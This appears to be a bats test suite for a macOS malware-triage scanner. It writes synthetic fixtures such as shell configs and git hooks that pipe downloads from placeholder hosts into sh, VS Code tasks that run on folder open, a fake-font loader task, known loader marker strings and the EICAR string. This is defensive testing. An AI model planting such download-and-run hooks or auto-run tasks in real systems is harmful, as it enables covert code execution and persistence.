#!/usr/bin/env bats
# Detection tests with synthetic fixtures (no real malware).
# Strings that look like malware traits are assembled at runtime so that
# mac-triage scanning this repository does not flag its own test files.

load ../helpers

setup(){ make_env; }
teardown(){ drop_env; }

mod(){ MODULE="$1" PATH="$REPO/tests/stubs:/usr/bin:/bin:/usr/sbin:/sbin" run /bin/bash "$(ls "$SRC"/modules/"$1"-*.sh)"; }

@test "07 flags a shell config that pipes a download into sh" {
  printf 'export X=1\n%s http://example.invalid/x | sh\n' "cu""rl" > "$UH/.zshrc"
  mod 07
  grep -q "^\[07\] Suspicious command in $UH/.zshrc" "$RUN/.flags.raw"
}

@test "07 flags an alias that overrides sudo" {
  printf "alias sudo='%s'\n" "/tmp/x" > "$UH/.zshrc"
  mod 07
  grep -q "Shell overrides a sensitive command" "$RUN/.flags.raw"
}

@test "17 flags a VS Code task that runs when the folder opens" {
  mkdir -p "$UH/proj/.vscode"
  printf '{"version":"2.0.0","tasks":[{"label":"x","command":"node x.js","runOptions":{"runOn":"%s"}}]}\n' "folder""Open" > "$UH/proj/.vscode/tasks.json"
  mod 17
  grep -q "Auto-run task runs code on folder open: $UH/proj/.vscode/tasks.json" "$RUN/.flags.raw"
}

@test "17 flags the known injected loader marker in project source" {
  mkdir -p "$UH/proj"
  printf 'const a=1;var %s=["x"];\n' "_\$_5e""f4" > "$UH/proj/index.js"
  mod 17
  grep -q "Injected malware marker found: $UH/proj/index.js" "$RUN/.flags.raw"
}

@test "17 flags a config file with an abnormally long line" {
  mkdir -p "$UH/proj"
  { printf 'module.exports={};'; printf ' %.0s' $(seq 1 1100); printf 'x\n'; } > "$UH/proj/next.config.js"
  mod 17
  grep -q "Config file with an abnormally long line: $UH/proj/next.config.js" "$RUN/.flags.raw"
}

@test "16 flags an SSH config that runs commands and a non-default npm registry" {
  mkdir -p "$UH/.ssh"
  printf 'Host x\n  ProxyCommand nc %%h %%p\n' > "$UH/.ssh/config"
  printf 'registry=https://registry.example.invalid/\n' > "$UH/.npmrc"
  mod 16
  grep -q "SSH config can run commands" "$RUN/.flags.raw"
  grep -q "Non-default package registry configured" "$RUN/.flags.raw"
}

@test "15 flags an unpacked (sideloaded) Chromium extension" {
  p="$UH/Library/Application Support/FakeBrowser/Default"
  mkdir -p "$p/Extensions/abcdefghijklmnop/1.0"
  printf '{"name":"Fixture","version":"1.0","permissions":["cookies"]}\n' > "$p/Extensions/abcdefghijklmnop/1.0/manifest.json"
  printf '{"extensions":{"settings":{"abcdefghijklmnop":{"location":4,"path":"/tmp/x"}}}}\n' > "$p/Secure Preferences"
  mod 15
  grep -q "Unpacked (sideloaded) extension in FakeBrowser Default" "$RUN/.flags.raw"
  grep -q "FakeBrowser | Default | abcdefghijklmnop | Fixture" "$INV/browser_ext.txt"
}

yara_rules(){
  [ -x /opt/homebrew/bin/yarac ] || skip "YARA is not installed"
  /opt/homebrew/bin/yarac -w "$SRC/rules/custom.yar" "$TEST_TMP/custom.yarc"
}

@test "custom YARA rule matches a synthetic loader and not clean JavaScript" {
  yara_rules
  printf 'var %s=["a"];global[_$_5ef4[0x0]]=%s;\n' "_\$_5e""f4" "req""uire" > "$TEST_TMP/loader.txt"
  printf 'const fs = require("fs");\nconsole.log(fs.existsSync("x"));\n' > "$TEST_TMP/clean.js"
  run /opt/homebrew/bin/yara -C "$TEST_TMP/custom.yarc" "$TEST_TMP/loader.txt"
  [[ "$output" == *"MacTriage_JS_GlobalRequire_Loader"* ]] || return 1
  run /opt/homebrew/bin/yara -C "$TEST_TMP/custom.yarc" "$TEST_TMP/clean.js"
  [ -z "$output" ]
}

@test "ClamAV detects the EICAR test string" {
  [ -x /opt/homebrew/bin/clamscan ] || skip "ClamAV is not installed"
  ls /opt/homebrew/var/lib/clamav/*.c[lv]d >/dev/null 2>&1 || skip "ClamAV has no signature database"
  printf '%s%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR' '-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "$TEST_TMP/eicar.txt"
  run /opt/homebrew/bin/clamscan --no-summary "$TEST_TMP/eicar.txt"
  [[ "$output" == *"FOUND"* ]] || return 1
}

@test "17 flags a repository git config that can run commands, with file:line" {
  mkdir -p "$UH/proj/.git"
  printf '[core]\n\tfsmonitor = ./hook.sh\n' > "$UH/proj/.git/config"
  mod 17
  grep -qF "Repo git config can execute commands: $UH/proj/.git/config:	fsmonitor = ./hook.sh" "$RUN/.flags.raw"
}

@test "17 ignores a symlinked tasks.json" {
  mkdir -p "$UH/proj/.vscode" "$TEST_TMP/elsewhere"
  printf '{"runOn":"%s"}\n' "folder""Open" > "$TEST_TMP/elsewhere/tasks.json"
  ln -s "$TEST_TMP/elsewhere/tasks.json" "$UH/proj/.vscode/tasks.json"
  mod 17
  not grep -q "Task auto-runs" "$RUN/.flags.raw"
}

@test "16 flags git settings that run commands, with file:line" {
  printf '[core]\n\tpager = less -R\n' > "$UH/.gitconfig"
  mod 16
  grep -qF "Git setting that can run commands (verify): $UH/.gitconfig:	pager = less -R" "$RUN/.flags.raw"
}

@test "21 flags password exports, stray keys and .env files by path only" {
  mkdir -p "$UH/Downloads" "$UH/Desktop" "$UH/Documents/app" "$UH/Documents/notes"
  printf 'name,url,username,password\nx,https://x,u,%s\n' "pw-not-real" > "$UH/Downloads/export.csv"
  printf '%s\nabc\n' "-----BEGIN OPENSSH PRI""VATE KEY-----" > "$UH/Desktop/server.pem"
  printf 'TOKEN=x\n' > "$UH/Desktop/.env"
  printf 'TOKEN=x\n' > "$UH/Documents/app/.env"; echo '{}' > "$UH/Documents/app/package.json"
  printf 'x\n' > "$UH/Documents/notes/bank passwords.txt"
  printf 'x\n' > "$UH/Documents/Apple Recovery Key.pdf"
  printf 'a,b\n1,2\n' > "$UH/Downloads/data.csv"
  mod 21
  grep -qxF "[21] Plaintext password export on disk: $UH/Downloads/export.csv" "$RUN/.flags.raw"
  grep -qxF "[21] Private key file outside ~/.ssh: $UH/Desktop/server.pem" "$RUN/.flags.raw"
  grep -qxF "[21] .env file outside a project: $UH/Desktop/.env" "$RUN/.flags.raw"
  grep -qxF "[21] Possible password file (by name): $UH/Documents/notes/bank passwords.txt" "$RUN/.flags.raw"
  grep -qxF "[21] Possible password file (by name): $UH/Documents/Apple Recovery Key.pdf" "$RUN/.flags.raw"
  not grep -q "app/.env\|data.csv" "$RUN/.flags.raw"
  not grep -q "pw-not-real\|abc" <<<"$output"
}

@test "17 flags the PolinRider fake-font task as critical, with its settings and the fake font" {
  mkdir -p "$UH/proj/.vscode" "$UH/proj/public/fonts" "$UH/ok/.vscode" "$UH/ok/public/fonts"
  printf '{"tasks":[{"label":"eslint-check","command":"node ./public/fonts/fa-solid-900.woff2","runOptions":{"runOn":"%s"}}]}\n' "folder""Open" > "$UH/proj/.vscode/tasks.json"
  printf '{"task.allowAutomaticTasks": true}\n' > "$UH/proj/.vscode/settings.json"
  printf 'var a=1;\n' > "$UH/proj/public/fonts/fa-solid-900.woff2"
  printf 'wOF2\000\001rest' > "$UH/ok/public/fonts/real.woff2"
  printf '{"tasks":[{"label":"lint","command":"npm run lint","runOptions":{"runOn":"%s"}}]}\n' "folder""Open" > "$UH/ok/.vscode/tasks.json"
  mod 17
  grep -qxF "[17] Auto-run task runs code on folder open: $UH/proj/.vscode/tasks.json" "$RUN/.flags.raw"
  grep -qxF "[17] Project turns on automatic tasks without asking: $UH/proj/.vscode/settings.json" "$RUN/.flags.raw"
  grep -qxF "[17] Font file is really a program (fake font): $UH/proj/public/fonts/fa-solid-900.woff2" "$RUN/.flags.raw"
  grep -qxF "[17] Task auto-runs on folder open: $UH/ok/.vscode/tasks.json" "$RUN/.flags.raw"
  not grep -q "real.woff2" "$RUN/.flags.raw"
}

@test "17 finds the newer published loader markers, also in Python files" {
  mkdir -p "$UH/py" "$UH/js"
  printf 'print(1)\n# %s\n' "lzcdrtfx""yqiplpd" > "$UH/py/setup.py"
  printf 'var a="%s";\n' "rmcej%ot""b%" > "$UH/js/app.js"
  mod 17
  grep -qF "Injected malware marker found: $UH/py/setup.py" "$RUN/.flags.raw"
  grep -qF "Injected malware marker found: $UH/js/app.js" "$RUN/.flags.raw"
}

@test "16 skips only the plain osxkeychain credential helper" {
  printf '[credential]\n\thelper = osxkeychain\n' > "$UH/.gitconfig"
  mod 16
  not grep -q "Git setting that can run commands" "$RUN/.flags.raw"
  printf '[credential]\n\thelper = "!f(){ osxkeychain; %s x.invalid; }; f"\n' "cu""rl" > "$UH/.gitconfig"
  : > "$RUN/.flags.raw"
  mod 16
  grep -q "Git setting that can run commands (verify): $UH/.gitconfig:" "$RUN/.flags.raw"
}

@test "16 flags hooks from a global git template folder and a global hooksPath" {
  mkdir -p "$UH/.tpl/hooks" "$UH/.ghooks" "$UH/.git-templates/hooks"
  printf '[init]\n\ttemplateDir = ~/.tpl\n[core]\n\thooksPath = "%s"\n' "$UH/.ghooks" > "$UH/.gitconfig"
  printf '#!/bin/sh\nexit 0\n' > "$UH/.tpl/hooks/pre-commit"
  printf '#!/bin/sh\n%s -s https://x.invalid/a | sh\n' "cu""rl" > "$UH/.ghooks/pre-push"
  printf '#!/bin/sh\nexit 0\n' > "$UH/.git-templates/hooks/post-checkout"
  printf 'sample\n' > "$UH/.tpl/hooks/pre-commit.sample"
  mod 16
  grep -qxF "[16] Git template adds a hook to every new repository (verify): $UH/.tpl/hooks/pre-commit" "$RUN/.flags.raw"
  grep -qxF "[16] Git template adds a hook to every new repository (verify): $UH/.git-templates/hooks/post-checkout" "$RUN/.flags.raw"
  grep -qxF "[16] Git hook downloads or runs hidden code: $UH/.ghooks/pre-push" "$RUN/.flags.raw"
  grep -qF "Git setting that can run commands (verify): $UH/.gitconfig:	templateDir = ~/.tpl" "$RUN/.flags.raw"
  not grep -q "pre-commit.sample" "$RUN/.flags.raw"
}

@test "17 flags a repository hook that runs a script from a hidden home folder, not a plain hook" {
  mkdir -p "$UH/proj/.git/hooks" "$UH/ok/.git/hooks"
  printf '#!/bin/sh\n%s "$HOME/.node-cache/index.js" &\n' "no""de" > "$UH/proj/.git/hooks/pre-commit"
  printf '#!/bin/sh\nnpx lint-staged\n' > "$UH/ok/.git/hooks/pre-commit"
  mod 17
  grep -qxF "[17] Git hook downloads or runs hidden code: $UH/proj/.git/hooks/pre-commit" "$RUN/.flags.raw"
  not grep -q "$UH/ok/" "$RUN/.flags.raw"
}
